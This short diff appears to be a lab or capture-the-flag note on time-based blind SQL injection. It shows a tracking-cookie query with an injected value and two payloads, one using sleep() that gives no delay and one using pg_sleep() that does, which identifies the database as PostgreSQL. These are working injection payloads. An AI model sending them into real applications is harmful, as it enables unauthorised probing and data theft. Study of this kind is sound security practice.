@@ -1,0 +1,7 @@
+
+select tracking-id from tracking-table where trackingid='OVmpehhTPt2iCL19'|| (SELECT sleep(10))--';
+
+' || (SELECT sleep(10))--
+-> No delay
+' || (SELECT pg_sleep(10))-- 
+-> With delay
